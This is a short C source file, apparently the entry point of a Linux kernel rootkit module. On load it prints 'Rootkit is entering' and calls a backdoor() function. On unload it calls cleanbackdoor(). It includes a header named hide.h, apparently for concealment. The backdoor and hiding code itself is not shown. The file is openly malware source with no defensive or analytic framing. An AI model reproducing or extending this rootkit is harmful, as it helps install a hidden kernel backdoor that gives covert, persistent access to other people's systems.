#include "../header/hide.h"

static int __init mode_init(void) {
    printk(KERN_INFO "Rootkit is entering.\n");
    backdoor();
    return 0;
}

static void __exit mode_exit(void) {
    cleanbackdoor();
    printk(KERN_INFO "Rootkit is leaving.\n");
}

module_init(mode_init);
module_exit(mode_exit);